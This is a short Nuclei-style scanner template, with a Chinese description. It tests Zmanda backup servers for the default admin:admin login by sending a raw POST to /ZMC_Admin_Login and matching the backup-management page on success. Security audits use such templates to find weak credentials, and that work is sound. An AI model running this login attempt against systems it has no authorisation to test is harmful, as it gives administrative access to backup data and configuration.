id: zmanda-default-login

info:
  name: Zmanda 默认口令登录（弱口令）
  author: Techryptic (@Tech)
  severity: high
  description: 该模板通过尝试 Zmanda 的默认管理员账号口令（如 admin:admin），并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.zmanda.com
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: zmanda,default-login,vuln

http:
  - raw:
      - |
        POST /ZMC_Admin_Login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: zmc_cookies_enabled=true

        login=AEE&last_page=&username={{username}}&password={{password}}&submit=Login&JS_SWITCH=JS_ON

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "ZMC - Backup Set Management"

      - type: status
        status:
          - 200
